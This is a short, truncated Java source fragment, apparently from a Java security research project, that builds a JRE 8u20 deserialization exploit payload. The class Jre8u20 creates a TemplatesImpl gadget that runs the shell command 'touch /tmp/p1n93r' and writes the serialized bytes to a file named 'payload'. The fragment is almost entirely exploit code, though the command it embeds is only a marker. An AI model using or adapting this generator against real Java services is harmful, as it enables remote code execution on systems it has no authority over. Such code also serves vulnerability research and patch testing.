...
import com.pinger.javasec.util.tmp.Reflections;
import com.pinger.javasec.util.tmp.Util;
...
public class Jre8u20 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("touch /tmp/p1n93r");
        ...
        FileOutputStream fous = new FileOutputStream("payload");
        fous.write(bytes);
